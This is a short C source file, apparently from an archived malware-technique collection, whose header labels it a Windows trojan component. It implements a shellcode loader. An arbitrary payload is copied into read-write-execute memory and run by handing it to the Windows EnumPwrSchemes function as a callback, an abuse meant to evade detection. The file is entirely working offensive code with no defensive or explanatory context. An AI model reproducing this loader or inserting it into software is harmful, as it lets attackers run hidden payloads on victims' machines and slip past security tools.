/*
  name      Vx Api
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "Win32Helper.h"

VOID InvokeEnumPwrSchemesCallbackRoutine(LPVOID lpParameter)
{
	EnumPwrSchemes((PWRSCHEMESENUMPROC)lpParameter, NULL);
}

BOOL MpfSceViaEnumPwrSchemes(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumPwrSchemesCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}